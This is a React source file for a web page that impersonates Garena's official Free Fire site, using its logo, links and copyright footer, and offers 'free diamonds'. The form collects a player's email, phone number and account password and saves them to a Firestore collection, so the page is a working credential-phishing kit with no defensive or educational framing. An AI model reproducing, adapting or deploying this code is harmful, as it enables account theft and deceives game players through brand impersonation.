
import { useState } from "react";
import { collection, addDoc } from "firebase/firestore";
import db from "../firebase";
import { Menu, X } from "lucide-react";

const FreeFireWebsite = () => {
  const [menuOpen, setMenuOpen] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    phone: "",
    password: "",
    diamonds: ""
  });
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, "freefire_users"), formData);
      setSuccess(true);
      setFormData({ email: "", phone: "", password: "", diamonds: "" });
    } catch (error) {
      console.error("Error adding document: ", error);
    }
  };

  return (
    <div className="font-sans bg-primary text-secondary min-h-screen">
      {/* Navbar */}
      <nav className="flex items-center justify-between px-6 py-4 bg-black sticky top-0 z-50">
      <img
  src="/assets/logoff.png"
  alt="Free Fire Logo"
  className="max-w-[100px] md:max-w-[180px] h-auto"
/>
        <div className="md:hidden text-white">
          <button onClick={() => setMenuOpen(!menuOpen)}>
            {menuOpen ? <X size={24} /> : <Menu size={24} />}
          </button>
        </div>
        <ul className="hidden md:flex space-x-6 text-lg text-white">
          <li><a href="https://ff.garena.com/id/chars/" className="hover:text-accent">Game</a></li>
          <li><a href="https://ff.garena.com/id/news/" className="hover:text-accent">Berita</a></li>
          <li><a href="https://ff.garena.com/id/video/" className="hover:text-accent">Media</a></li>
          <li><a href="#index" className="hover:text-accent">Hadiah</a></li>
        </ul>
        {menuOpen && (
          <ul className="absolute top-16 right-6 bg-black shadow-md px-6 py-4 rounded-md space-y-2 text-white md:hidden">
            <li><a href="https://ff.garena.com/id/chars/">Game</a></li>
            <li><a href="https://ff.garena.com/id/news/">Berita</a></li>
            <li><a href="https://ff.garena.com/id/video/">Media</a></li>
            <li><a href="#index">Hadiah</a></li>
          </ul>
        )}
      </nav>

      {/* Hero Section */}
      <section
       className="relative h-screen flex justify-center items-center bg-cover bg-center"
       style={{ backgroundImage: "url('/assets/view.jpg')" }}
     >
       <img
         src="/assets/andrew.png"
         alt="Andrew Character"
         className="max-w-full max-h-[80vh] animate-fadeIn"
       />
      </section>

      {/* Login Form */}
      <main className="px-6 py-12 max-w-xl mx-auto">
        <h2 className="text-3xl font-semibold mb-4 text-center">Klaim Diamond Gratis</h2>
        {success && (
          <p className="text-green-600 mb-4 text-center">Data berhasil dikirim!</p>
        )}
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder="Email"
            className="w-full p-3 border rounded"
            value={formData.email}
            onChange={(e) => setFormData({ ...formData, email: e.target.value })}
            required
          />
          <input
            type="text"
            placeholder="Nomor HP"
            className="w-full p-3 border rounded"
            value={formData.phone}
            onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
            required
          />
          <input
            type="password"
            placeholder="Password Akun"
            className="w-full p-3 border rounded"
            value={formData.password}
            onChange={(e) => setFormData({ ...formData, password: e.target.value })}
            required
          />
          <input
            type="number"
            placeholder="Jumlah Diamond"
            className="w-full p-3 border rounded"
            value={formData.diamonds}
            onChange={(e) => setFormData({ ...formData, diamonds: e.target.value })}
            required
          />
          <button type="submit" className="w-full bg-yellow-500 text-black py-3 rounded font-semibold">
            Klaim Sekarang
          </button>
        </form>
      </main>

      {/* Footer */}
      <footer className="bg-black text-white px-6 py-6 text-sm text-center space-y-2">
        <p>
          Copyright © Garena International. Trademarks belong to their respective owners. All rights
          reserved.
        </p>
        <div className="space-x-4">
          <a href="https://contentgarena-a.akamaihd.net/legal/pp/pp_id.html" className="underline">Privacy Policy</a>
          <a href="https://ff.garena.com/id/faq/" className="underline">For Parents FAQ</a>
          <a href="https://content.garena.com/legal/tos/tos_id.html" className="underline">Syarat Layanan</a>
        </div>
      </footer>
    </div>
  );
};

export default FreeFireWebsite;
